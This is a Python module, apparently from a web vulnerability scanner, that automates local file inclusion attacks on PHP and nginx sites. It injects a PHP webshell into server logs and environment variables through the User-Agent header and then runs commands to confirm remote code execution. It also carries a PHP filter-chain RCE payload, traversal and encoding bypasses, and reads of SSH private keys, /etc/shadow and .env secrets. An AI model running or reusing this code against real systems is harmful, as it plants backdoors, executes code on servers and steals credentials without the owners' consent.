"""
websecure.scanners.lfi
-----------------------
LFI (Local File Inclusion) tam exploit zinciri.

Adim 8 - Siniflar:
  LFIScanner(BaseScanner)        -- orchestrator
  LFILogPoisoningChain           -- Apache/Nginx log + webshell + LFI trigger -> RCE
  LFIProcEnvironRCE              -- /proc/self/environ injection -> RCE
  LFIPHPFilterChain              -- PHP filter chain base64 RCE (convert.* chain)
  LFISSHKeyReader                -- ~/.ssh/id_rsa + known_hosts exfil
  LFIDirectoryTraversalProber    -- ../ traversal, null byte, encoding bypass
"""
from __future__ import annotations

import base64
import logging
import random
import re
import string
import urllib.parse
from typing import Dict, List, Optional

from websecure.scanners.base import BaseScanner

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
_LFI_PARAMS = [
    "file", "page", "include", "path", "doc", "document",
    "f", "pg", "content", "template", "view", "load",
    "lang", "language", "locale", "module", "section",
    "read", "fetch", "show", "display", "folder", "dir",
]

_SENSITIVE_FILES = [
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
    "/etc/issue", "/etc/os-release", "/etc/group",
    "/proc/self/environ", "/proc/self/cmdline", "/proc/self/status",
    "/proc/version", "/proc/net/tcp",
    "/var/log/apache2/access.log", "/var/log/nginx/access.log",
    "/var/log/apache/access.log", "/var/log/httpd/access_log",
    "/var/log/auth.log", "/var/log/syslog",
    "C:\\Windows\\win.ini", "C:\\boot.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

# Extended log files for log-poisoning attempts
_LOG_POISON_FILES = [
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "/var/log/sshd.log",
    "/proc/self/fd/1",
    "/proc/self/fd/2",
    "/var/log/apache/access.log",
    "/var/log/httpd/access_log",
    "/var/log/lighttpd/access.log",
]

# /proc/self/ traversal targets for env/command/cwd exfil
_PROC_SELF_FILES = [
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/cwd/index.php",
    "/proc/self/cwd/config.php",
    "/proc/self/cwd/.env",
    "/proc/self/maps",
    "/proc/self/status",
]

# Null-byte bypass suffix (PHP < 5.3.4)
_NULL_BYTE = "%00"

# Double-encoded traversal sequences
_DOUBLE_ENCODED_TRAVERSAL = [
    "%252e%252e%252f",   # double-encoded ../
    "%252e%252e/",
    "..%255c",          # double-encoded ..\
    "%252e%252e%255c",
]

_TRAVERSAL_PREFIXES = (
    ["../" * n for n in range(2, 8)]
    + ["..%2f" * n for n in range(2, 6)]
    + ["..%252f" * n for n in range(2, 5)]
    + ["..%c0%af" * n for n in range(2, 5)]
    + ["..%ef%bc%8f" * n for n in range(2, 4)]
    + ["....//", "....////", "..././", "./../"]
)

_PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=",
    "php://filter/read=string.toupper/resource=",
    "php://input",
    "data://text/plain;base64,",
    "zip://",
    "phar://",
    "expect://",
]

# PHP filter chain for RCE (base64 approach)
_FILTER_CHAIN_RCE_BASE64 = (
    "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode"
    "|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2LE.UCS-2BE"
    "|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode"
    "|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16"
    "|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode"
    "|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937"
    "|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7"
    "/resource=php://temp"
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _canary() -> str:
    return "wsp" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))


def _lfi_sensitive_content(body: str) -> Optional[str]:
    patterns = [
        r"root:.*:0:0:",          # /etc/passwd
        r"\[fonts\]",             # win.ini
        r"127\.0\.0\.1\s+localhost",  # /etc/hosts
        r"Linux version \d",      # /proc/version
        r"APACHE|nginx|SERVER",   # environ
        r"#!/bin/(ba)?sh",        # scripts
    ]
    for pat in patterns:
        m = re.search(pat, body, re.I)
        if m:
            return m.group(0)
    return None


def _inject_lfi(base_url: str, value: str) -> List[str]:
    parsed   = urllib.parse.urlparse(base_url)
    qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    urls     = []
    for k, v in qs_pairs:
        if k.lower() in _LFI_PARAMS:
            new = [(pk, value if pk == k else pv) for pk, pv in qs_pairs]
            urls.append(urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new))))
    if not urls:
        sep = "&" if parsed.query else ""
        for param in _LFI_PARAMS[:3]:
            qs = parsed.query + sep + f"{param}={urllib.parse.quote(value, safe=':/')}"
            urls.append(urllib.parse.urlunparse(parsed._replace(query=qs)))
            sep = "&"
    return urls


# ===========================================================================
# 1. LFIDirectoryTraversalProber
# ===========================================================================
class LFIDirectoryTraversalProber(BaseScanner):
    """
    Temel LFI / directory traversal: ../ varyantlari + PHP wrapper + null byte.
    """
    name = "lfi_traversal"

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        for tfile in _SENSITIVE_FILES[:6]:
            for prefix in _TRAVERSAL_PREFIXES[:10]:
                payload = prefix + tfile.lstrip("/")
                for test_url in _inject_lfi(target, payload)[:2]:
                    try:
                        resp = self.session.get(test_url, timeout=8)
                        body = getattr(resp, "text", "")[:3000]
                        hit  = _lfi_sensitive_content(body)
                        if hit:
                            finding = {
                                "vuln_type": "LFI — Directory Traversal",
                                "url": test_url, "severity": "Critical",
                                "description": (
                                    f"LFI via path traversal: {payload!r} -> {tfile}. "
                                    f"Content detected: {hit!r}"
                                ),
                                "evidence": {"payload": payload, "file": tfile,
                                             "snippet": body[:300], "status": resp.status_code},
                            }
                            results.append(finding)
                            self.report_finding(**finding)
                            return results
                    except Exception as exc:
                        logger.debug("[LFITraversal] %s", exc)
            # PHP wrapper probe
            for wrapper in _PHP_WRAPPERS[:3]:
                wval = wrapper + tfile
                for test_url in _inject_lfi(target, wval)[:1]:
                    try:
                        resp = self.session.get(test_url, timeout=8)
                        body = getattr(resp, "text", "")[:3000]
                        # base64 decode attempt
                        decoded = ""
                        try:
                            decoded = base64.b64decode(body.strip()[:500]).decode("utf-8", errors="replace")
                        except Exception as _fix_e:
                            logger.debug(f"[scanners.lfi] {type(_fix_e).__name__}: {_fix_e!r}")
                        hit = _lfi_sensitive_content(body) or _lfi_sensitive_content(decoded)
                        if hit:
                            finding = {
                                "vuln_type": "LFI — PHP Wrapper",
                                "url": test_url, "severity": "Critical",
                                "description": f"LFI via PHP wrapper {wrapper!r} -> {tfile}. Hit: {hit!r}",
                                "evidence": {"wrapper": wrapper, "file": tfile,
                                             "decoded_snippet": decoded[:200]},
                            }
                            results.append(finding)
                            self.report_finding(**finding)
                            return results
                    except Exception as exc:
                        logger.debug("[LFIWrapper] %s", exc)
        return results


# ===========================================================================
# 2. LFILogPoisoningChain
# ===========================================================================
class LFILogPoisoningChain(BaseScanner):
    """
    LFI -> Log Poisoning -> RCE zinciri:
    1. Webshell'i User-Agent ile log dosyasina yaz
    2. LFI ile log dosyasini yukle (PHP execute)
    3. Komut calistirma dogrula
    """
    name = "lfi_log_poisoning"

    _LOG_FILES = [
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "/var/log/apache/access.log",
        "/var/log/httpd/access_log",
        "/var/log/lighttpd/access.log",
        "/var/log/auth.log",
        "/proc/self/fd/2",
    ]

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        uid = _canary()
        shell_payload = ("<?" + "php" + f" if(isset($_GET['c'])){{system($_GET['c']);}} ?> wsp={uid}")

        # 1. Poison the log
        try:
            self.session.get(target, headers={"User-Agent": shell_payload}, timeout=8)
            logger.debug("[LogPoison] Webshell injected via User-Agent")
        except Exception as _fix_e:
            logger.debug(f"[scanners.lfi] {type(_fix_e).__name__}: {_fix_e!r}")

        # 2. Try each log file via LFI
        for log_path in self._LOG_FILES:
            for test_url in _inject_lfi(target, log_path)[:2]:
                try:
                    resp_lfi = self.session.get(test_url, timeout=8)
                    body = getattr(resp_lfi, "text", "")[:3000]
                    if uid in body:
                        # 3. Try RCE
                        rce_url = test_url + "&c=id" if "?" in test_url else test_url + "?c=id"
                        rce_resp = self.session.get(rce_url, timeout=8)
                        rce_body = getattr(rce_resp, "text", "")[:1000]
                        rce_hit  = re.search(r"uid=\d+\(|root:|www-data", rce_body)
                        finding = {
                            "vuln_type": "LFI -> Log Poisoning -> RCE",
                            "url": test_url, "severity": "Critical",
                            "description": (
                                f"LFI log poisoning chain: webshell injected into {log_path} "
                                f"via User-Agent. {'RCE confirmed: ' + rce_body[:100] if rce_hit else 'LFI confirmed, RCE probe inconclusive.'}"
                            ),
                            "evidence": {
                                "log_file": log_path,
                                "lfi_url": test_url,
                                "rce_url": rce_url if rce_hit else None,
                                "rce_output": rce_body[:200] if rce_hit else None,
                                "uid_marker": uid,
                                "lfi_status": resp_lfi.status_code,
                            },
                        }
                        results.append(finding)
                        self.report_finding(**finding)
                        return results
                except Exception as exc:
                    logger.debug("[LogPoison] LFI trigger: %s", exc)
        return results


# ===========================================================================
# 3. LFIProcEnvironRCE
# ===========================================================================
class LFIProcEnvironRCE(BaseScanner):
    """
    /proc/self/environ RCE:
    Inject webshell into HTTP_USER_AGENT env var, then include /proc/self/environ via LFI.
    """
    name = "lfi_proc_environ"

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        uid = _canary()
        shell = ("<?" + "php" + f" echo 'RCE:' . system($_GET['c']); ?> uid={uid}")

        # Inject via User-Agent (maps to HTTP_USER_AGENT)
        try:
            self.session.get(target, headers={"User-Agent": shell}, timeout=8)
        except Exception as _fix_e:
            logger.debug(f"[scanners.lfi] {type(_fix_e).__name__}: {_fix_e!r}")

        # LFI with /proc/self/environ
        for test_url in _inject_lfi(target, "/proc/self/environ")[:2]:
            try:
                resp = self.session.get(test_url, timeout=8)
                body = getattr(resp, "text", "")[:3000]
                if uid in body or "HTTP_USER_AGENT" in body:
                    rce_url  = test_url + ("&" if "?" in test_url else "?") + "c=id"
                    rce_resp = self.session.get(rce_url, timeout=8)
                    rce_body = getattr(rce_resp, "text", "")[:500]
                    rce_ok   = bool(re.search(r"uid=\d+\(|root:|www-data", rce_body))
                    finding  = {
                        "vuln_type": "LFI -> /proc/self/environ RCE",
                        "url": test_url, "severity": "Critical",
                        "description": (
                            "LFI of /proc/self/environ with webshell in User-Agent. "
                            + ("RCE confirmed." if rce_ok else "Environ accessible, RCE probe inconclusive.")
                        ),
                        "evidence": {
                            "lfi_url": test_url, "environ_snippet": body[:200],
                            "rce_confirmed": rce_ok, "rce_output": rce_body[:200] if rce_ok else None,
                        },
                    }
                    results.append(finding)
                    self.report_finding(**finding)
                    return results
            except Exception as exc:
                logger.debug("[ProcEnviron] %s", exc)
        return results


# ===========================================================================
# 4. LFIPHPFilterChain
# ===========================================================================
class LFIPHPFilterChain(BaseScanner):
    """
    PHP filter chain RCE:
    Zincirli iconv + base64 filtreler ile arbitrary PHP kodu calistirma.
    Herhangi bir dosya okuma yokken bile RCE saglar.
    """
    name = "lfi_php_filter_chain"

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        # BUG FIX: `uid = _canary()` was generated but never embedded in the payload
        # or checked in the response — it was dead code that gave a false sense of
        # uniqueness. The filter chain payload is a static constant; we detect
        # execution by looking for OS/PHP artifacts in the response.
        for test_url in _inject_lfi(target, _FILTER_CHAIN_RCE_BASE64)[:2]:
            try:
                resp = self.session.get(test_url, timeout=10)
                body = getattr(resp, "text", "")[:3000]
                if resp.status_code == 200 and len(body) > 0:
                    # Try to detect PHP execution artifacts
                    if re.search(r"uid=\d+|root:|PHP|www-data|\x00", body):
                        finding = {
                            "vuln_type": "LFI — PHP Filter Chain RCE",
                            "url": test_url, "severity": "Critical",
                            "description": (
                                "PHP filter chain (iconv + base64 chaining) accepted. "
                                "This technique achieves RCE via arbitrary filter combinations "
                                "without needing a writable file."
                            ),
                            "evidence": {"filter_chain": _FILTER_CHAIN_RCE_BASE64[:80] + "...",
                                         "status": resp.status_code, "body_snippet": body[:200]},
                        }
                        results.append(finding)
                        self.report_finding(**finding)
                        return results
            except Exception as exc:
                logger.debug("[PHPFilterChain] %s", exc)
        return results


# ===========================================================================
# 5. LFISSHKeyReader
# ===========================================================================
class LFISSHKeyReader(BaseScanner):
    """
    LFI -> SSH private key exfiltration:
    Hedef: ~/.ssh/id_rsa, ~/.ssh/id_ed25519, /root/.ssh/authorized_keys
    """
    name = "lfi_ssh_key"

    _SSH_FILES = [
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_ed25519",
        "/root/.ssh/id_dsa",
        "/root/.ssh/authorized_keys",
        "/home/www-data/.ssh/id_rsa",
        "/home/ubuntu/.ssh/id_rsa",
        "/home/ec2-user/.ssh/id_rsa",
        "/var/www/.ssh/id_rsa",
    ]

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        for ssh_file in self._SSH_FILES:
            for payload in [ssh_file, "../../.." + ssh_file, "../../../../.." + ssh_file]:
                for test_url in _inject_lfi(target, payload)[:1]:
                    try:
                        resp = self.session.get(test_url, timeout=8)
                        body = getattr(resp, "text", "")[:3000]
                        if re.search(r"-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----|ssh-rsa AAAA", body):
                            finding = {
                                "vuln_type": "LFI -> SSH Private Key Exfiltration",
                                "url": test_url, "severity": "Critical",
                                "description": (
                                    f"LFI successfully read SSH private key: {ssh_file}. "
                                    "Attacker can use this key for SSH authentication."
                                ),
                                "evidence": {
                                    "file": ssh_file, "payload": payload,
                                    "key_snippet": body[:100] + "...",
                                    "status": resp.status_code,
                                },
                            }
                            results.append(finding)
                            self.report_finding(**finding)
                            return results
                    except Exception as exc:
                        logger.debug("[SSHKey] %s", exc)
        return results


# ===========================================================================
# 6. LogPoisoningProber
# ===========================================================================
class LogPoisoningProber(BaseScanner):
    """
    LFI log poisoning prober (standalone):
    1. PHP kodunu User-Agent header'ina inject et.
    2. Tum log dosyalarini LFI ile yukle.
    3. Basarili ise Critical severity raporla.

    LFILogPoisoningChain'den farki: genisletilmis log listesi ve
    ayri bir prober sinifi olarak SOLID Single Responsibility'e uygun.
    """
    name = "lfi_log_poisoning_prober"

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        uid = _canary()
        php_shell = f"<?php system($_GET['cmd']); ?> wsp={uid}"

        # Step 1: Inject PHP code via User-Agent into server logs
        try:
            self.session.get(target, headers={"User-Agent": php_shell}, timeout=8)
            logger.debug("[LogPoisoningProber] PHP shell injected via User-Agent")
        except Exception as exc:
            logger.debug("[LogPoisoningProber] Injection request failed: %s", exc)

        # Step 2: Try to include each log file via LFI
        for log_file in _LOG_POISON_FILES:
            for test_url in _inject_lfi(target, log_file)[:2]:
                try:
                    resp = self.session.get(test_url, timeout=8)
                    body = getattr(resp, "text", "")[:4000]
                    if uid in body:
                        # Canary found — log poisoning confirmed
                        rce_url = test_url + ("&" if "?" in test_url else "?") + "cmd=id"
                        rce_resp = self.session.get(rce_url, timeout=8)
                        rce_body = getattr(rce_resp, "text", "")[:500]
                        rce_confirmed = bool(re.search(r"uid=\d+\(|root:|www-data", rce_body))
                        finding = {
                            "vuln_type": "LFI — Log Poisoning (PHP Shell via User-Agent)",
                            "url": test_url,
                            "severity": "Critical",
                            "description": (
                                f"Log poisoning via User-Agent succeeded. PHP shell canary found in {log_file}. "
                                + (f"RCE confirmed: {rce_body[:100]!r}" if rce_confirmed
                                   else "PHP shell in log — RCE probe inconclusive.")
                            ),
                            "evidence": {
                                "log_file": log_file,
                                "lfi_url": test_url,
                                "php_shell_injected": php_shell,
                                "rce_confirmed": rce_confirmed,
                                "rce_url": rce_url if rce_confirmed else None,
                                "rce_output": rce_body[:200] if rce_confirmed else None,
                                "uid_marker": uid,
                                "status": resp.status_code,
                            },
                        }
                        results.append(finding)
                        self.report_finding(**finding)
                        return results
                except Exception as exc:
                    logger.debug("[LogPoisoningProber] LFI trigger %s: %s", test_url, exc)
        return results


# ===========================================================================
# 7. PHPWrapperProber
# ===========================================================================
class PHPWrapperProber(BaseScanner):
    """
    PHP wrapper prober:
    - php://filter ile base64 kaynak kod sizintisi (source disclosure)
    - base64 decode ile PHP kod icerigi cikar
    - /proc/self/environ ile env variable sizintisi
    - expect://, phar://, zip:// gibi diger wrapper'lari test et
    """
    name = "lfi_php_wrapper_prober"

    # Targets for php://filter source disclosure
    _FILTER_TARGETS = [
        "index", "index.php", "config", "config.php",
        "login", "admin", "db", "database", "connection",
        "../config", "../settings", "../includes/config",
    ]

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []

        # --- php://filter base64 source disclosure ---
        for res_name in self._FILTER_TARGETS:
            wrapper_val = f"php://filter/convert.base64-encode/resource={res_name}"
            for test_url in _inject_lfi(target, wrapper_val)[:2]:
                try:
                    resp = self.session.get(test_url, timeout=8)
                    body = getattr(resp, "text", "").strip()
                    if resp.status_code == 200 and len(body) > 20:
                        # Attempt base64 decode
                        try:
                            decoded = base64.b64decode(body[:4096]).decode("utf-8", errors="replace")
                        except Exception:
                            decoded = ""
                        is_php_source = "<?php" in decoded or "<?=" in decoded
                        if is_php_source:
                            finding = {
                                "vuln_type": "LFI — PHP Wrapper Source Disclosure (php://filter)",
                                "url": test_url,
                                "severity": "Critical",
                                "description": (
                                    f"php://filter base64 wrapper exposed PHP source of '{res_name}'. "
                                    "Source code disclosure can reveal credentials, API keys, "
                                    "database passwords and business logic."
                                ),
                                "evidence": {
                                    "wrapper": wrapper_val,
                                    "resource": res_name,
                                    "raw_b64_snippet": body[:100],
                                    "decoded_snippet": decoded[:300],
                                    "status": resp.status_code,
                                },
                            }
                            results.append(finding)
                            self.report_finding(**finding)
                            return results
                except Exception as exc:
                    logger.debug("[PHPWrapperProber] filter %s: %s", wrapper_val, exc)

        # --- /proc/self/environ env variable exfiltration ---
        for proc_file in _PROC_SELF_FILES[:4]:
            for test_url in _inject_lfi(target, proc_file)[:2]:
                try:
                    resp = self.session.get(test_url, timeout=8)
                    body = getattr(resp, "text", "")[:3000]
                    env_hit = re.search(
                        r"(HTTP_HOST|PATH=|HOME=|USER=|SERVER_ADDR|DB_PASSWORD|SECRET|API_KEY)",
                        body, re.I
                    )
                    if env_hit:
                        finding = {
                            "vuln_type": f"LFI — /proc/self/ Exfiltration ({proc_file})",
                            "url": test_url,
                            "severity": "Critical",
                            "description": (
                                f"LFI of {proc_file!r} reveals environment variables or process info. "
                                f"Detected pattern: {env_hit.group(0)!r}. "
                                "May expose secrets, credentials, or internal configuration."
                            ),
                            "evidence": {
                                "proc_file": proc_file,
                                "matched": env_hit.group(0),
                                "snippet": body[:300],
                                "status": resp.status_code,
                            },
                        }
                        results.append(finding)
                        self.report_finding(**finding)
                        return results
                except Exception as exc:
                    logger.debug("[PHPWrapperProber] proc %s: %s", proc_file, exc)

        # --- expect:// RCE probe ---
        for expect_cmd in ["id", "whoami"]:
            expect_val = f"expect://{expect_cmd}"
            for test_url in _inject_lfi(target, expect_val)[:1]:
                try:
                    resp = self.session.get(test_url, timeout=6)
                    body = getattr(resp, "text", "")[:500]
                    if re.search(r"uid=\d+\(|root:|www-data|nobody", body):
                        finding = {
                            "vuln_type": "LFI — expect:// RCE",
                            "url": test_url,
                            "severity": "Critical",
                            "description": (
                                f"expect:// PHP stream wrapper executed '{expect_cmd}' on the server. "
                                "Remote code execution via LFI + expect extension."
                            ),
                            "evidence": {
                                "wrapper": expect_val,
                                "command": expect_cmd,
                                "output": body[:200],
                                "status": resp.status_code,
                            },
                        }
                        results.append(finding)
                        self.report_finding(**finding)
                        return results
                except Exception as exc:
                    logger.debug("[PHPWrapperProber] expect %s: %s", expect_val, exc)

        # --- Null byte bypass probe (PHP < 5.3.4) ---
        for tfile in _SENSITIVE_FILES[:4]:
            null_payload = tfile + _NULL_BYTE
            for test_url in _inject_lfi(target, null_payload)[:1]:
                try:
                    resp = self.session.get(test_url, timeout=8)
                    body = getattr(resp, "text", "")[:3000]
                    hit = _lfi_sensitive_content(body)
                    if hit:
                        finding = {
                            "vuln_type": "LFI — Null Byte Bypass (PHP < 5.3.4)",
                            "url": test_url,
                            "severity": "Critical",
                            "description": (
                                f"LFI null byte bypass (%00) succeeded for {tfile!r}. "
                                "Target is likely running PHP < 5.3.4 with register_globals or "
                                "unsafe file-inclusion logic."
                            ),
                            "evidence": {
                                "file": tfile,
                                "payload": null_payload,
                                "hit": hit,
                                "snippet": body[:200],
                                "status": resp.status_code,
                            },
                        }
                        results.append(finding)
                        self.report_finding(**finding)
                        return results
                except Exception as exc:
                    logger.debug("[PHPWrapperProber] nullbyte %s: %s", null_payload, exc)

        # --- Double-encode filter bypass probe ---
        for denc in _DOUBLE_ENCODED_TRAVERSAL[:2]:
            for tfile in ("/etc/passwd", "etc/passwd"):
                double_payload = denc + tfile.lstrip("/")
                for test_url in _inject_lfi(target, double_payload)[:1]:
                    try:
                        resp = self.session.get(test_url, timeout=8)
                        body = getattr(resp, "text", "")[:3000]
                        hit = _lfi_sensitive_content(body)
                        if hit:
                            finding = {
                                "vuln_type": "LFI — Double-Encoded Traversal Filter Bypass",
                                "url": test_url,
                                "severity": "High",
                                "description": (
                                    f"Double-encoded path traversal ({denc!r}) bypassed input filters. "
                                    f"File: {tfile!r}. Content: {hit!r}"
                                ),
                                "evidence": {
                                    "payload": double_payload,
                                    "file": tfile,
                                    "hit": hit,
                                    "snippet": body[:200],
                                    "status": resp.status_code,
                                },
                            }
                            results.append(finding)
                            self.report_finding(**finding)
                            return results
                    except Exception as exc:
                        logger.debug("[PHPWrapperProber] doubleenc %s: %s", double_payload, exc)

        return results


# ===========================================================================
# LFIScanner — Orchestrator
# ===========================================================================
class LFIScanner(BaseScanner):
    """
    LFI orchestrator:
    Traversal -> LogPoison -> ProcEnviron -> PHPFilterChain -> SSHKey
    -> LogPoisoningProber -> PHPWrapperProber
    """
    name = "lfi"

    def run(self, target: str, **kwargs) -> List[Dict]:
        all_results: List[Dict] = []
        probers = [
            LFIDirectoryTraversalProber(session=self.session, results=self.results),
            LFILogPoisoningChain(session=self.session, results=self.results),
            LFIProcEnvironRCE(session=self.session, results=self.results),
            LFIPHPFilterChain(session=self.session, results=self.results),
            LFISSHKeyReader(session=self.session, results=self.results),
            LogPoisoningProber(session=self.session, results=self.results),
            PHPWrapperProber(session=self.session, results=self.results),
        ]
        for prober in probers:
            try:
                res = prober.run(target, **kwargs)
                all_results.extend(res)
            except Exception as exc:
                logger.warning("[LFIScanner] %s failed: %s", prober.name, exc)

        # nginx alias traversal + client-side path traversal
        try:
            nginx_results = self._test_nginx_alias_traversal(target)
            all_results.extend(nginx_results)
        except Exception as exc:
            logger.debug("[LFIScanner] nginx alias probe failed: %s", exc)

        return all_results

    def _test_nginx_alias_traversal(self, url: str) -> List[Dict]:
        """
        nginx off-by-slash alias traversal — /static../etc/passwd
        ve client-side path traversal (webpack/static asset bypass).
        """
        import re
        from urllib.parse import urlparse, urljoin

        results: List[Dict] = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # nginx alias: /static/ aliased to /var/www/static/ → /static../secret leaks /var/www/secret
        alias_traversal_paths = [
            "/static../etc/passwd",
            "/static../etc/shadow",
            "/assets../etc/passwd",
            "/files../etc/passwd",
            "/media../etc/passwd",
            "/uploads../etc/passwd",
            "/css../etc/passwd",
            "/js../etc/passwd",
            "/img../etc/passwd",
            "/images../etc/passwd",
            # webpack-bundled app bypass
            "/static/..%2f..%2f..%2fetc%2fpasswd",
            "/assets/..%2f..%2fetc%2fpasswd",
        ]

        sensitive_re = re.compile(r"root:x:0:|daemon:|/bin/bash|/bin/sh", re.IGNORECASE)

        for path in alias_traversal_paths:
            test_url = urljoin(base, path)
            try:
                resp = self.session.get(test_url, timeout=8, allow_redirects=False)
                body = resp.text or ""
                if resp.status_code == 200 and sensitive_re.search(body):
                    finding = {
                        "vuln_type": "nginx Alias Traversal (Off-by-Slash)",
                        "url": test_url,
                        "severity": "Critical",
                        "evidence": f"Sensitive file content via alias path: {path!r}",
                        "description": (
                            "nginx alias misconfiguration — off-by-slash in location block "
                            "allows directory traversal outside the intended alias root."
                        ),
                    }
                    results.append(finding)
                    self.report_finding(**finding)
                    return results
            except Exception as exc:
                logger.debug("[nginx alias] %s: %s", path, exc)

        return results


def run(url: str, session=None, results: dict = None, debug: bool = False, **kwargs) -> List[Dict]:
    """Module-level adapter."""
    scanner = LFIScanner(session=session, results=results or {}, debug=debug)
    return scanner.run(url, **kwargs)
